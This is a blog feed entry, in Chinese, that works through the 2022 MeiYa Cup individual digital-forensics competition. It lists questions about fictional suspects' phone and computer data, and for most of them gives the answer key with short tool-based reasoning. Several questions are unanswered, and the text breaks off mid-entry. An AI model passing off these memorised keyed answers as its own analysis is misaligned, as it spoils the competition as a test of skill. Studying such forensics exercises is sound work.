<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dr4x3zz</title>
  
  
  <link href="https://dr4x3zz.github.io/atom.xml" rel="self"/>
  
  <link href="https://dr4x3zz.github.io/"/>
  <updated>2024-11-06T08:47:33.761Z</updated>
  <id>https://dr4x3zz.github.io/</id>
  
  <author>
    <name>Dr4x3zz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MeiYa2022-Individual</title>
    <link href="https://dr4x3zz.github.io/2024/11/03/MeiYa2022-Individual/"/>
    <id>https://dr4x3zz.github.io/2024/11/03/MeiYa2022-Individual/</id>
    <published>2024-11-03T14:53:39.000Z</published>
    <updated>2024-11-06T08:47:33.761Z</updated>
    
    <content type="html"><![CDATA[<p>复现一下，准备一下 2024 的美亚</p><p>学习链接：</p><p>1、<a href="https://forensics.xidian.edu.cn/wiki/MeiyaCup2022Indivi/">2022 美亚杯个人赛 - XDforensics-Wiki</a></p><p>2、<a href="https://blog.csdn.net/wow0524/article/details/128025410">https://blog.csdn.net/wow0524/article/details/128025410</a></p><p>3、<a href="https://blog.csdn.net/wow0524/article/details/128025410">2022 美亚个人赛复盘_2022 美亚杯 容器密码 - CSDN 博客</a></p><h5 id="1单选题-王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果highlight2分"><a class="markdownIt-Anchor" href="#1单选题-王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果highlight2分">#</a> 1.[单选题] 王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果 (Highlight)?(2 分)</h5><p>A. 卿有何妙计</p><p>B. 宝玉已是三杯过去了</p><p>C. 武松那日早饭罢</p><p>D. 就除他做个强马温罢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>搜索 book 看看相关程序，电子书应该就和这个有关吧，跳转源文件看看</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C10.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="10"></p><p>在该目录下有一个数据库文件</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C11.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="11"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C12.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="12"></p><p>可以看到是三国演义，然后就没有什么有用的信息了，再看看别的文件夹</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C13.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="13"></p><p>在这个路径下有一个数据库文件</p><h5 id="2多选题-王晓琳的手机里有一个-mtr-mobile-港的手机程序mobile-app-检视其数据库database-的数据王晓琳于2022年10月11日-2204-时将一行程加入书签bookmark这段行程的起点及终点站包括2分"><a class="markdownIt-Anchor" href="#2多选题-王晓琳的手机里有一个-mtr-mobile-港的手机程序mobile-app-检视其数据库database-的数据王晓琳于2022年10月11日-2204-时将一行程加入书签bookmark这段行程的起点及终点站包括2分">#</a> 2.[多选题] 王晓琳的手机里有一个 MTR Mobile (港) 的手机程序 (Mobile App)。 检视其数据库 (Database) 的数据，王晓琳于 2022 年 10 月 11 日 22:04 时将一行程加入书签 (Bookmark)，这段行程的起点及终点站包括？(2 分)</h5><p>A. 尖沙咀</p><p>B. 红硒</p><p>C. 康城</p><p>D. 青衣</p><p>E. 沙田</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DE</span><br></pre></td></tr></table></figure><p>搜索 mtr</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C1.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1"></p><p>转到源文件，找到 E_Tourist.db</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C2.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2"></p><p>打开数据库文件，可以发现有一个时间戳和 is_bookmark，如果后者的值为 1，应该就是加入到书签，所以范围缩小到两个，查一下 2022-10-11 22:04:00 的时间戳是 1665497040</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C3.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="3"></p><p>所以为青衣和沙田</p><h5 id="3填空题-王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片以拉伯数字回答1分"><a class="markdownIt-Anchor" href="#3填空题-王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片以拉伯数字回答1分">#</a> 3.[填空题] 王晓琳于 2022 年 10 月 2 日使用她的手机拍摄了多少张的照片？(以拉伯数字回答)(1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">90</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C4.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="4"></p><p>过滤一下，他说的是拍摄，苹果手机拍摄出来的格式是 HEIC，过滤一下文件名，但是本题过滤完日期都是 HEIC 的照片</p><h5 id="4单选题-检视王晓琳的手机照片她于2022年10月2日到过什么地方1分"><a class="markdownIt-Anchor" href="#4单选题-检视王晓琳的手机照片她于2022年10月2日到过什么地方1分">#</a> 4.[单选题] 检视王晓琳的手机照片，她于 2022 年 10 月 2 日到过什么地方？(1 分)</h5><p>A. 大潭郊游径</p><p>B. 城门畔塘径</p><p>C. 大榄麦理浩径</p><p>D. 京士柏卫理径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C5.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="5"></p><p>没啥好说的直接找</p><h5 id="5单选题-李大辉使用的是一台lg-v10的手机它的型号是什么1分"><a class="markdownIt-Anchor" href="#5单选题-李大辉使用的是一台lg-v10的手机它的型号是什么1分">#</a> 5.[单选题] 李大辉使用的是一台 LG V10 的手机，它的型号是什么？(1 分)</h5><p>A. LGH960C</p><p>B. LGH961N</p><p>C. LGH960H</p><p>D. LGH961C</p><p>E. LGH961D</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C6.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="6"></p><h5 id="6单选题-李大辉的手机最常搜索的类别category-是什么1分"><a class="markdownIt-Anchor" href="#6单选题-李大辉的手机最常搜索的类别category-是什么1分">#</a> 6.[单选题] 李大辉的手机最常搜索的类别 (Category) 是什么？(1 分)</h5><p>A. 护肤品</p><p>B. 旅游</p><p>C. 运动</p><p>D. 学校</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C7.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="7"></p><h5 id="7填空题-李大辉最近光顾了一家美丰快运公司这快递件的单号是什么不要输入符号及空白以阿拉伯数字回答1分"><a class="markdownIt-Anchor" href="#7填空题-李大辉最近光顾了一家美丰快运公司这快递件的单号是什么不要输入符号及空白以阿拉伯数字回答1分">#</a> 7.[填空题] 李大辉最近光顾了一家美丰快运公司，这快递件的单号是什么？(不要输入符号及空白，以阿拉伯数字回答)(1 分）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4567567812344567</span><br></pre></td></tr></table></figure><p>是谷歌相册的缓存图片，看别的 wp 好像是邮件的附件，火眼好像看不了邮件内容，然后美亚的手机大师没有附件然后邮件内容全是我放案件的路径，什么内容都没有。。。</p><p>只能用最原始的方法找出来了，参考西电的 wp</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C8.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="8"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C9.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="9"></p><h5 id="8单选题-李大辉收到的电邮中有一个钓鱼链结phishing-link这个链结的地址是什么1分"><a class="markdownIt-Anchor" href="#8单选题-李大辉收到的电邮中有一个钓鱼链结phishing-link这个链结的地址是什么1分">#</a> 8.[单选题] 李大辉收到的电邮中有一个钓鱼链结 (Phishing Link)，这个链结的地址是什么？(1 分)</h5><p>A. 以上皆非</p><p>B. <a href="https://bit.ly/3yeARcO">https://bit.ly/3yeARcO</a></p><p>C. <a href="https://bit.ly/5vM12">https://bit.ly/5vM12</a></p><p>D. <a href="http://bit.ly/Hell0">http://bit.ly/Hell0</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C14.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="14"></p><p>美亚手机大师查看邮件内容</p><h5 id="9单选题-承上题这封电邮是从哪个电邮地址寄出的1分"><a class="markdownIt-Anchor" href="#9单选题-承上题这封电邮是从哪个电邮地址寄出的1分">#</a> 9.[单选题] 承上题，这封电邮是从哪个电邮地址寄出的？(1 分)</h5><p>A. 以上皆非</p><p>B. <a href="mailto:Cavinchow456@yahoo.com">Cavinchow456@yahoo.com</a></p><p>C. <a href="mailto:2020ChanChan@hotmail.com">2020ChanChan@hotmail.com</a></p><p>D. <a href="mailto:30624700Peter@proton.me">30624700Peter@proton.me</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p>同上</p><h5 id="10单选题-承上题寄出这封电邮的ip地址是2分"><a class="markdownIt-Anchor" href="#10单选题-承上题寄出这封电邮的ip地址是2分">#</a> 10.[单选题] 承上题，寄出这封电邮的 IP 地址是？(2 分)</h5><p>A. 以上皆非</p><p>B. 65.54.185.39</p><p>C. 10.13.105.56</p><p>D. 58.152.110.218</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>根据第二个 wp 的分析，因为这封电邮是林浚熙寄出的，结合案件的报告可以知道案情以及林浚熙的 ip</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C16.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="16"></p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C15.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="15"></p><h5 id="11单选题-李大辉手机有一个orderxlsx-的档案被加密了解密钥匙是什么1分"><a class="markdownIt-Anchor" href="#11单选题-李大辉手机有一个orderxlsx-的档案被加密了解密钥匙是什么1分">#</a> 11 [单选题] 李大辉手机有一个 orderxlsx 的档案被加密了，解密钥匙是什么？(1 分)</h5><p>A. 2022 Nov!</p><p>B. 20221101</p><p>C. Nov2022!</p><p>D. P@sswOrd!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>相册中可以找到，也可以把这四个依次拿去试一下就知道了</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C17.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="17"></p><h5 id="12填空题香港的街道上每一枝街灯都有编号-分析李大辉手机里的程序kmb-1933哪一枝街灯在经度-latitude-224160270000纬度longitude-1142139450000-附近它的编号是什么以大写英及阿拉伯数字回答2分"><a class="markdownIt-Anchor" href="#12填空题香港的街道上每一枝街灯都有编号-分析李大辉手机里的程序kmb-1933哪一枝街灯在经度-latitude-224160270000纬度longitude-1142139450000-附近它的编号是什么以大写英及阿拉伯数字回答2分">#</a> 12.[填空题] 香港的街道上每一枝街灯都有编号。分析李大辉手机里的程序 KMB 1933，哪一枝街灯在经度 (Latitude) 22.4160270000，纬度 (Longitude) 114.2139450000 附近，它的编号是什么？(以大写英及阿拉伯数字回答)(2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CE1453</span><br></pre></td></tr></table></figure><p>搜索 kmb 定位到包，连接数据库搜索经纬度</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C19.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="19"></p><p>可以定位到这一行， <code>SC02-S-1100-0</code>  我感觉应该是分区的编号，灯柱的编号应该是 CE1453</p><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C18.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="18"></p><h5 id="13填空题李大辉的手机里有一张由该手机拍的照片照片的元资料metadata-曾被修改这张照片的档案名是什么以大写英文及数字回答不用回答副档名2分"><a class="markdownIt-Anchor" href="#13填空题李大辉的手机里有一张由该手机拍的照片照片的元资料metadata-曾被修改这张照片的档案名是什么以大写英文及数字回答不用回答副档名2分">#</a> 13.[填空题] 李大辉的手机里有一张由该手机拍的照片，照片的元资料 (Metadata) 曾被修改，这张照片的档案名是什么？(以大写英文及数字回答，不用回答副档名)(2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20220922_152622.jpg</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C20.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="20"></p><p>清晰</p><h5 id="14单选题-分析李大辉的手机里的资料他在哪一间公司工作2分"><a class="markdownIt-Anchor" href="#14单选题-分析李大辉的手机里的资料他在哪一间公司工作2分">#</a> 14.[单选题] 分析李大辉的手机里的资料，他在哪一间公司工作？(2 分)</h5><p>A. 美丽好化妆品公司</p><p>B. 步步高贸易公司</p><p>C. 盛大国际有限公司</p><p>D. 永恒化妆品公司</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C21.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="21"></p><h5 id="15填空题-林浚熙曾经以手机登录google账户的验证码是什么不要输入符号以大写英文及阿拉伯数字回答1分"><a class="markdownIt-Anchor" href="#15填空题-林浚熙曾经以手机登录google账户的验证码是什么不要输入符号以大写英文及阿拉伯数字回答1分">#</a> 15.[填空题] 林浚熙曾经以手机登录 Google 账户的验证码是什么？(不要输入符号，以大写英文及阿拉伯数字回答)(1 分)</h5><p>服了，检材好像坏了，林浚熙的手机导入之后检测不到，先跳过了，先练别的</p><h5 id="16填空题-林浚熙手机的-whatsapp-号码是什么号码swhatsappnet-以阿拉伯数字回答1分"><a class="markdownIt-Anchor" href="#16填空题-林浚熙手机的-whatsapp-号码是什么号码swhatsappnet-以阿拉伯数字回答1分">#</a> 16.[填空题] 林浚熙手机的 WhatsApp’ 号码是什么？(号码)@s.whatsapp.net? (以阿拉伯数字回答)(1 分)</h5><h5 id="17单选题-通过分析林浚熙手机的照片判断他在何处偷拍王晓琳1分"><a class="markdownIt-Anchor" href="#17单选题-通过分析林浚熙手机的照片判断他在何处偷拍王晓琳1分">#</a> 17.[单选题] 通过分析林浚熙手机的照片，判断他在何处偷拍王晓琳？(1 分)</h5><h5 id="18填空题-林浚熙曾经删掉自己拍摄的照片这张照片的档案名filename-是什么不要输入以大写英文及阿拉伯数字回答-如cat10jpg需回答cat10jpg2分"><a class="markdownIt-Anchor" href="#18填空题-林浚熙曾经删掉自己拍摄的照片这张照片的档案名filename-是什么不要输入以大写英文及阿拉伯数字回答-如cat10jpg需回答cat10jpg2分">#</a> 18.[填空题] 林浚熙曾经删掉自己拍摄的照片，这张照片的档案名 (Filename) 是什么？(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答 CAT10JPG)(2 分)</h5><h5 id="19填空题-王晓琳曾经发送一个pdf档案予林浚熙这个档案的文件签名file-signature-是什么以十六进制数字答首八位数值如foa1c5e12分"><a class="markdownIt-Anchor" href="#19填空题-王晓琳曾经发送一个pdf档案予林浚熙这个档案的文件签名file-signature-是什么以十六进制数字答首八位数值如foa1c5e12分">#</a> 19.[填空题] 王晓琳曾经发送一个 PDF 档案予林浚熙，这个档案的文件签名 (File Signature) 是什么？(以十六进制数字答首八位数值，如 FOA1C5E1)(2 分)</h5><h5 id="20填空题-承上题该pdf档案内包含一位曾经被肩的受害者资料-分析林熙手机的数据这位受害者的英文名字是什么不要输入符号及空白以大写英文回答2分"><a class="markdownIt-Anchor" href="#20填空题-承上题该pdf档案内包含一位曾经被肩的受害者资料-分析林熙手机的数据这位受害者的英文名字是什么不要输入符号及空白以大写英文回答2分">#</a> 20.[填空题] 承上题，该 PDF 档案内包含一位曾经被肩的受害者资料。分析林熙手机的数据，这位受害者的英文名字是什么？(不要输入符号及空白，以大写英文回答)(2 分)</h5><h5 id="21单选题-分析林浚熙手机上的数据他在2022年10月17日计划去什么地方2分"><a class="markdownIt-Anchor" href="#21单选题-分析林浚熙手机上的数据他在2022年10月17日计划去什么地方2分">#</a> 21.[单选题] 分析林浚熙手机上的数据，他在 2022 年 10 月 17 日计划去什么地方？(2 分)</h5><p>A. 以上皆非</p><p>B. 荃湾站</p><p>C. 沙田站</p><p>D. 国际金融中心二期</p><h5 id="22填空题-承上题上述行程的结束时间是如答案为-10159需回答-1601592分"><a class="markdownIt-Anchor" href="#22填空题-承上题上述行程的结束时间是如答案为-10159需回答-1601592分">#</a> 22.[填空题] 承上题，上述行程的结束时间是？(如答案为 1:01:59，需回答 160159)(2 分)</h5><h5 id="23填空题-于林浚熙的手机里在2022年9月1日-或以后哪一张照片是由其他手机拍摄的而它的档案名是什么不要输入以大写英文及阿拉伯数字回答-如-cat10jpg需回答cat10jpg2分"><a class="markdownIt-Anchor" href="#23填空题-于林浚熙的手机里在2022年9月1日-或以后哪一张照片是由其他手机拍摄的而它的档案名是什么不要输入以大写英文及阿拉伯数字回答-如-cat10jpg需回答cat10jpg2分">#</a> 23.[填空题] 于林浚熙的手机里，在 2022 年 9 月 1 日 或以后，哪一张照片是由其他手机拍摄的，而它的档案名是什么？(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答 CAT10JPG)(2 分)</h5><h5 id="24单选题-根据照片的数据库photossglite资料哪一个栏目标题column-header-可以显示这张照片的接收方式2分"><a class="markdownIt-Anchor" href="#24单选题-根据照片的数据库photossglite资料哪一个栏目标题column-header-可以显示这张照片的接收方式2分">#</a> 24.[单选题] 根据照片的数据库 Photos.sglite 资料，哪一个栏目标题 (Column Header) 可以显示这张照片的接收方式？(2 分)</h5><p>A. ZRECEIVEMETHODIDENTIFIER</p><p>B. ZIMPORTEDFROMSOURCEIDENTIFIER</p><p>C. ZIMPORTEDBYBUNDLEIDENTIFIER</p><p>D. ZRECEIVEDFROMIDENTIFIER</p><h5 id="25单选题-承上题这张照片通过什么方式接收2分"><a class="markdownIt-Anchor" href="#25单选题-承上题这张照片通过什么方式接收2分">#</a> 25.[单选题] 承上题，这张照片通过什么方式接收？(2 分)</h5><p>A. 网页下载</p><p>B. 蓝牙传送</p><p>C. 以上皆非</p><p>D. WhatsApp 软件传送</p><p>E. Signal 软件传送</p><h5 id="26填空题-承上题这张照片原本的档案名original-filename-是什么不要输入以大写英文及阿拉伯数字回答-如-cat10jpg需回答cat10jpg3分"><a class="markdownIt-Anchor" href="#26填空题-承上题这张照片原本的档案名original-filename-是什么不要输入以大写英文及阿拉伯数字回答-如-cat10jpg需回答cat10jpg3分">#</a> 26.[填空题] 承上题，这张照片原本的档案名 (Original Filename) 是什么？不要输入，以大写英文及阿拉伯数字回答。如 Cat10,jpg，需回答 CAT10JPG)(3 分)</h5><h5 id="27林浚熙手机里有一个备忘录-notes-被上了锁这个备忘录的名称是什么-以大写英文及阿拉伯数字回答-1分"><a class="markdownIt-Anchor" href="#27林浚熙手机里有一个备忘录-notes-被上了锁这个备忘录的名称是什么-以大写英文及阿拉伯数字回答-1分">#</a> 27. 林浚熙手机里有一个备忘录 (Notes) 被上了锁，这个备忘录的名称是什么？(以大写英文及阿拉伯数字回答) (1 分)</h5><h5 id="28填空题-承上题上述备忘录的内容有一串数字它是什么以阿拉伯数字回答2分"><a class="markdownIt-Anchor" href="#28填空题-承上题上述备忘录的内容有一串数字它是什么以阿拉伯数字回答2分">#</a> 28.[填空题] 承上题，上述备忘录的内容有一串数字，它是什么？(以阿拉伯数字回答)(2 分)</h5><h5 id="29单选题-林浚熙计算机computer-的操作系统operating-system-版本是什么1分"><a class="markdownIt-Anchor" href="#29单选题-林浚熙计算机computer-的操作系统operating-system-版本是什么1分">#</a> 29.[单选题] 林浚熙计算机 (Computer) 的操作系统 (Operating System) 版本是什么？(1 分)</h5><p>A. Windows 10 Pro for Workstations 21H2</p><p>B. Windows 10 Pro 22H2</p><p>C. Windows 10 Home 21H2</p><p>D. Windows 10 Pro for Workstations 21H1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C22.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="22"></p><h5 id="30填空题-林浚照计算机安装了什么品牌的虚拟专用网络-virtual-private-network-vpn软件不要输入符号及空白以大写英文及阿拉伯数字回答1分"><a class="markdownIt-Anchor" href="#30填空题-林浚照计算机安装了什么品牌的虚拟专用网络-virtual-private-network-vpn软件不要输入符号及空白以大写英文及阿拉伯数字回答1分">#</a> 30.[填空题] 林浚照计算机安装了什么品牌的虚拟专用网络 Virtual Private Network - VPN) 软件？(不要输入符号及空白，以大写英文及阿拉伯数字回答)(1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPRESSVPN</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C23.png" class="lazyload" data-srcset="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="23"></p><h5 id="31填空题-承上题分析该虚拟专用网络的日志log他在哪天安装该虚拟专用网络如答案为-2022-12-29需回答-202212292分"><a class="markdownIt-Anchor" href="#31填空题-承上题分析该虚拟专用网络的日志log他在哪天安装该虚拟专用网络如答案为-2022-12-29需回答-202212292分">#</a> 31.[填空题] 承上题，分析该虚拟专用网络的日志 (Log)，他在哪天安装该虚拟专用网络？(如答案为 2022-12-29，需回答 20221229)(2 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20220915</span><br></pre></td></tr></table></figure><p><img src="/2024/11/03/MeiYa2022-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2022-Individual%5C24.png" class="lazyload" 